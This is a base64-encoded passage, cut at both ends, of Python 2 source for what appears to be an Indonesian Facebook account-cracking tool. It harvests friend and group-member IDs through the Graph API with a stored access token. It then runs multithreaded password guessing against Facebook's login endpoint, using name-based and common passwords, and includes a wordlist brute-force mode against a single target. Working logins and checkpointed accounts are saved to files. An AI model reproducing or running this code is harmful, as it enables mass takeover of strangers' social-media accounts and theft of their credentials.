sxOzk3bVsgXDAzM1sxOzkybU9L4pyTXDAzM1sxOzk3bSBdICIrdXNlcm5hbWUrInwiICtwYXNzdysiID0+Iit6WyduYW1lJ10pCgkJCWVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIG1wc2hbImVycm9yX21zZyJdOgoJCQkJY2VrID0gb3Blbigib3V0L21iZl9jcC50eHQiLCAidyIpCgkJCQljZWsud3JpdGUodXNlcm5hbWUrInwiK3Bhc3N3KyJcbiIpCgkJCQljZWsuY2xvc2UoKQoJCQkJY2VrcG9pbnQuYXBwZW5kKCJcMDMzWzE7OTdtWyBcMDMzWzE7OTNtQ1DinJpcMDMzWzE7OTdtIF0gIit1c2VybmFtZSsifCIgK3Bhc3N3KQoJCQllbHNlOgoJCQkJZ2FnYWwuYXBwZW5kKHVzZXJuYW1lKQoJCQkJYmFjayArPTEKCQkJc3lzLnN0ZG91dC53cml0ZSgnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inLhcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQ3JhY2sgICAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcrc3RyKGJhY2spKycgXDAzM1sxOzk2bT5cMDMzWzE7OTdtICcrc3RyKGxlbih1cCkpKycgPT5cMDMzWzE7OTJtTGl2ZVwwMzNbMTs5MW06XDAzM1sxOzk2bScrc3RyKGxlbihiZXJoYXNpbCkpKycgXDAzM1sxOzk3bT0+XDAzM1sxOzkzbUNoZWNrXDAzM1sxOzkxbTpcMDMzWzE7OTZtJytzdHIobGVuKGNla3BvaW50KSkpO3N5cy5zdGRvdXQuZmx1c2goKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXG5cMDMzWzE7OTFtWyFdIFNsZWVwIgoJCXRpbWUuc2xlZXAoMSkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQkKZGVmIGhhc2lsKCk6CglwcmludAoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkjIyNCZXJoYXNpbAoJZm9yIGIgaW4gYmVyaGFzaWw6CgkJcHJpbnQoYikKCSMjI0NFSwoJZm9yIGMgaW4gY2VrcG9pbnQ6CgkJcHJpbnQoYykKCSMjI0dhZ2FsCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXByaW50ICgiXDAzM1szMW1beF0gRmFpbGVkIFwwMzNbMTs5N20tLT4gIiArIHN0cihsZW4oZ2FnYWwpKSkKCWtlbHVhcigpCgkKIyMjIyMjIyMjIyMjIyMjIFNVUEVSIE1CRiAjIyMjIyMjIyMjIyMjIyMjCmRlZiBzdXBlcigpOgoJZ2xvYmFsIHRva2V0Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoNSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICIxXS4gQ3JhY2sgbGlzdCBmcmllbmQiCglwcmludCAiMl0uIENyYWNrICBmcm9tIGZyaWVuZCIKCXByaW50ICIzXS4gQ3JhY2sgZnJvbSBtZW1iZXIgZ3JvdXAiCglwcmludCAiMF0uIEJhY2siCglwcmludCAi4pWRIgoJcGlsaWhfc3VwZXIoKQoKZGVmIHBpbGloX3N1cGVyKCk6CglwZWFrID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiBwZWFrID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJcGlsaWhfc3VwZXIoKQoJZWxpZiBwZWFrID09IjEiOgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBpZCBcMDMzWzE7OTdtLi4uJykKCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkKCQlmb3IgcyBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChzWydpZCddKQoJZWxpZiBwZWFrID09IjIiOgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCQl0cnk6CgkJCWpvayA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCXN1cGVyKCkKCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGlkIGZyb20gZnJpZW5kIFwwMzNbMTs5N20uLi4nKQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpCgkJZm9yIGkgaW4gelsnZGF0YSddOgoJCQlpZC5hcHBlbmQoaVsnaWQnXSkKCWVsaWYgcGVhayA9PSIzIjoKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJaWRnPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCgkJdHJ5OgoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRnKycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQlzdXBlcigpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBpZCBcMDMzWzE7OTdtLi4uJykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWRnKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTkmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJcz1qc29uLmxvYWRzKHJlLnRleHQpCgkJZm9yIHAgaW4gc1snZGF0YSddOgoJCQlpZC5hcHBlbmQocFsnaWQnXSkKCWVsaWYgcGVhayA9PSIwIjoKCQltZW51X2hhY2soKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQlwaWxpaF9zdXBlcigpCgkJCglwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihpZCkpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXRpdGlrID0gWycuICAgJywnLi4gICcsJy4uLiAnXQoJZm9yIG8gaW4gdGl0aWs6CgkJcHJpbnQoIlxyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4py4XDAzM1sxOzkxbV0gXDAzM1sxOzkybUNyYWNrIFwwMzNbMTs5N20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQoJcHJpbnQKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCgkJCQoJIyMjIyMgY3JhY2sgIyMjIyMKCWRlZiBtYWluKGFyZyk6CgkJZ2xvYmFsIGNla3BvaW50LG9rcwoJCXVzZXIgPSBhcmcKCQl0cnk6CgkJCW9zLm1rZGlyKCdvdXQnKQoJCWV4Y2VwdCBPU0Vycm9yOgoJCQlwYXNzCgkJdHJ5OgoJCQkjUGFzczEKCQkJYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyt1c2VyKycvP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQliID0ganNvbi5sb2FkcyhhLnRleHQpCgkJCXBhc3MxID0gYlsnZmlyc3RfbmFtZSddKycxMjMnCgkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MxKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCgkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybURvbmVcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczErIiA9PiIrelsnbmFtZSddKQoJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MxKQoJCQllbHNlOgoJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3MxKyJcbiIpCgkJCQkJY2VrLmNsb3NlKCkKCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMSkKCQkJCWVsc2U6CgkJCQkJI1Bhc3MyCgkJCQkJcGFzczIgPSAic2F5YW5nIgoJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MyKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCgkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1Eb25lXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3MyKyIgPT4iK3pbJ25hbWUnXSkKCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MyKQoJCQkJCWVsc2U6CgkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczIrIlxuIikKCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMikKCQkJCQkJZWxzZToKCQkJCQkJCSNQYXNzMwoJCQkJCQkJcGFzczMgPSBiWydmaXJzdF9uYW1lJ10rJzEyMzQ1JwoJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczMpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1Eb25lXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3MzKyIgPT4iK3pbJ25hbWUnXSkKCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczMpCgkJCQkJCQllbHNlOgoJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3MzKyJcbiIpCgkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MzKQoJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCSNQYXNzNAoJCQkJCQkJCQlwYXNzNCA9ICJnYW50ZW5nIgoJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1Eb25lXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3M0KyIgPT4iK3pbJ25hbWUnXSkKCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNCkKCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNCsiXG4iKQoJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpCgkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCSNQYXNzNQoJCQkJCQkJCQkJCXBhc3M1ID0gYlsnbGFzdF9uYW1lJ10rJzEyMycKCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtRG9uZVwwMzNbMTs5N20gXSAiK3VzZXIrInwiICtwYXNzNSsiID0+Iit6WyduYW1lJ10pCgkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNSkKCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M1KyJcbiIpCgkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczUpCgkJCQkJCQkJCQkJCQoJCWV4Y2VwdDoKCQkJcGFzcwoJCQoJcCA9IFRocmVhZFBvb2woMzApCglwLm1hcChtYWluLCBpZCkKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgT0svQ1AgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzk3bS9cMDMzWzE7OTNtIitzdHIobGVuKGNla3BvaW50KSkKCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1DUCBGaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvc3VwZXJfY3AudHh0IikKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCglzdXBlcigpCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKIyMjIyMgQlJVVEUgRk9SQ0UgIyMjIyMKZGVmIGJydXRlKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCg0KQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJdHJ5OgoJCWVtYWlsID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20vXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bS9cMDMzWzE7OTJtSHAgXDAzM1sxOzk3bVRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCQlwYXNzdyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtV29yZGxpc3QgXDAzM1sxOzk3bWV4dChsaXN0LnR4dCkgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpCgkJdG90YWwgPSBvcGVuKHBhc3N3LCJyIikKCQl0b3RhbCA9IHRvdGFsLnJlYWRsaW5lcygpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitlbWFpbAoJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbFwwMzNbMTs5Nm0gIitzdHIobGVuKHRvdGFsKSkrIiBcMDMzWzE7OTJtUGFzc3dvcmQiCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCgkJc2FuZGkgPSBvcGVuKHBhc3N3LCJyIikKCQlmb3IgcHcgaW4gc2FuZGk6CgkJCXRyeToKCQkJCXB3ID0gcHcucmVwbGFjZSgiXG4iLCIiKQoJCQkJc3lzLnN0ZG91dC53cml0ZSgiXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inLhcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQ3JhY2sgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrcHcpCgkJCQlzeXMuc3Rkb3V0LmZsdXNoKCkKCQkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhlbWFpbCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHcpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQoJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKCQkJCQlkYXBhdCA9IG9wZW4oIkJydXRlLnR4dCIsICJ3IikKCQkJCQlkYXBhdC53cml0ZShlbWFpbCsiIHwgIitwdysiXG4iKQoJCQkJCWRhcGF0LmNsb3NlKCkKCQkJCQlwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZSBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitlbWFpbCkKCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykKCQkJCQlrZWx1YXIoKQoJCQkJZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06CgkJCQkJY2VrcyA9IG9wZW4oIkJydXRlY2VrcG9pbnQudHh0IiwgInciKQoJCQkJCWNla3Mud3JpdGUoZW1haWwrIiB8ICIrcHcrIlxuIikKCQkJCQljZWtzLmNsb3NlKCkKCQkJCQlwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQkJCQlwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgoJCQkJCXByaW50KCJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVVzZXJuYW1lIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2VtYWlsKQoJCQkJCXByaW50KCJcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybVBhc3N3b3JkIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK3B3KQoJCQkJCWtlbHVhcigpCgkJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJCXByaW50IlwwMzNbMTs5MW1bIV0gQ29ubmVjdGlvbiBFcnJvciIKCQkJCXRpbWUuc2xlZXAoNSkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50ICgiXDAzM1sxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCIpCgkJdGFueWF3KCkKZGVmIHRhbnlhdygpOgoJd2h5ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1DcmVhdGUgd29yZGxpc3QgPyBcMDMzWzE7OTJtW3kvbl1cMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCWlmIHdoeSA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIgoJCXRhbnlhdygpCgllbGlmIHdoeSA9PSJ5IjoKCQl3b3JkbGlzdCgpCgllbGlmIHdoeSA9PSJZIjoKCQl3b3JkbGlzdCgpCgllbGlmIHdoeSA9PSJuIjoKCQltZW51X2hhY2soKQoJZWxpZiB3aHkgPT0iTiI6CgkJbWVudV9oYWNrKCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCgkJdGFueWF3KCkKCQkKIyMjIyMgWUFIT08gQ0hFQ0tFUiAjIyMjIwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgbWVudV95YWhvbygpOgoJZ2xvYmFsIHRva2V0Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OT